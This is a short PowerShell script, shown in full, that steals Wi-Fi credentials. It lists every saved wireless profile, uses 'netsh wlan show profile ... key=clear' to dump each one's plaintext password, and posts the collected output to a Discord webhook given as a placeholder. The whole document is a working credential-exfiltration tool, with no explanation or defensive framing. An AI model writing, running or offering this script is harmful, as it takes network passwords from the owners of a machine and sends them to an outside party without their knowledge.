$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}
$output = ""

foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $output += "`n" + $details
}

$webhook = "YOUR_DISCORD_WEBHOOK"
$body = @{ "content" = "```$output```" } | ConvertTo-Json -Compress

Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
